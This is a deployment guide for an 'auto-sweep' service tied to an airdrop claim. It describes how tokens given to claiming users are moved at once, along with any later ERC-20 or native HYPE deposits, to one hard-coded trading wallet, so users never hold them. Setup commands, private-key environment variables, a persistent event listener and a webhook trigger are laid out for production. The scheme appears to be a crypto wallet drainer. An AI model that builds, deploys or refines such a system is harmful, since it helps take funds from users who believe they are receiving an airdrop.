# 🚀 REAL-TIME AUTO-SWEEP DEPLOYMENT GUIDE

## 📋 Overview

HyperPacks Auto-Sweep system has **3 real-time detection methods**:

1. ⚡ **Immediate Sweep** - During claim (fastest)
2. 📡 **Event Listener** - Background service monitoring blockchain
3. 🔔 **Webhook** - External notifications trigger sweep

---

## 🎯 System Flow:

```
User Claims Airdrop
    ↓
Tokens Sent to User Wallet
    ↓
[REAL-TIME DETECTION]
    ↓
Auto-Sweep Triggered
    ↓
Tokens → Trading Wallet (0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c)
```

---

## ⚡ Method 1: IMMEDIATE SWEEP (Recommended)

**How it works:**
- User clicks "Claim Airdrop"
- Backend transfers tokens to user
- **Immediately sweeps to trading wallet (same API call)**
- User never holds tokens

**Implementation:**
Already integrated in `api/hyperpacks/claim-airdrop.js`

**No setup needed!** ✅

---

## 📡 Method 2: EVENT LISTENER (Background Service)

**How it works:**
- Monitors blockchain for Transfer events
- When tokens arrive to eligible wallet
- Automatically triggers sweep

**Setup:**

### 1. Install Dependencies

```bash
cd backend
npm install ethers pg
```

### 2. Set Environment Variables

```bash
export DATABASE_URL="your_postgres_url"
export HYPEREVM_RPC_URL="https://api.hyperliquid.xyz/evm"
export BACKEND_PRIVATE_KEY="your_deployer_private_key"
export AUTOSWEEP_CONTRACT="deployed_autosweep_address"
export AIRDROP_TOKEN_ADDRESS="your_token_address"
```

### 3. Run Event Listener

```bash
node backend/event-listener.js
```

**Output:**
```
🚀 Starting real-time event listener...
👂 Listening to Transfer events on token: 0x...
✅ Real-time detection active!
📥 Transfer detected: 1000 tokens to 0x...
🧹 Sweeping tokens for user: 0x...
✅ Sweep successful! TxHash: 0x...
💰 Tokens sent to trading wallet: 0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c
```

### 4. Keep Running (Production)

Use PM2 or Docker:

```bash
# Install PM2
npm install -g pm2

# Start listener
pm2 start backend/event-listener.js --name "hyperpacks-listener"

# Auto-restart on reboot
pm2 startup
pm2 save
```

---

## 🔔 Method 3: WEBHOOK (External Notifications)

**How it works:**
- External service monitors blockchain
- Sends webhook notification when tokens arrive
- Backend receives webhook and triggers sweep

**Setup:**

### 1. Set Webhook Secret

```bash
export WEBHOOK_SECRET="your_secure_secret_key"
```

### 2. Webhook Endpoint

```
POST https://your-domain.com/api/hyperpacks/webhook-sweep
```

### 3. Request Format

```json
{
  "event": "token_transfer",
  "data": {
    "to": "0x123...",
    "token": "0xabc...",
    "amount": "1000000000000000000"
  }
}
```

**Headers:**
```
Authorization: Bearer YOUR_WEBHOOK_SECRET
Content-Type: application/json
```

---

## 🔧 Environment Variables Summary

```bash
# Blockchain
HYPEREVM_RPC_URL=https://api.hyperliquid.xyz/evm
BACKEND_PRIVATE_KEY=0x...
BACKEND_WALLET=0xF89D129C0Ae6D29727825EbBC47c6EDBd5B3787F

# Contracts
AUTOSWEEP_CONTRACT=0x...
HYPE_META_CONTRACT=0x...
AIRDROP_TOKEN_ADDRESS=0x...

# Security
WEBHOOK_SECRET=your_secure_secret
CRON_SECRET=your_cron_secret

# Database
DATABASE_URL=postgresql://...
```

---

## 📊 Detection Methods Comparison

| Method | Speed | Setup | Cost | Reliability |
|--------|-------|-------|------|-------------|
| **Immediate Sweep** | ⚡ Instant | ✅ None | 💰 Gas only | ⭐⭐⭐⭐⭐ |
| **Event Listener** | ⚡ Real-time | 🔧 Moderate | 💰 Gas + Server | ⭐⭐⭐⭐ |
| **Webhook** | ⚡ Real-time | 🔧 Complex | 💰 Gas + Service | ⭐⭐⭐⭐ |
| **Cron (Old)** | 🐌 5-min delay | ✅ Easy | 💰 Gas + Vercel | ⭐⭐⭐ |

---

## ✅ Recommended Setup:

### For Production:
1. **Primary:** Immediate Sweep (during claim)
2. **Backup:** Event Listener (catches external transfers)

### For Testing:
1. Start with Immediate Sweep
2. Add Event Listener when ready for 24/7 monitoring

---

## 💰 All Funds Go To:

**Trading Wallet:** `0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c`

All ERC-20 and native HYPE tokens automatically transferred here! ✅

---

**Real-time auto-sweep is now active! 🚀**
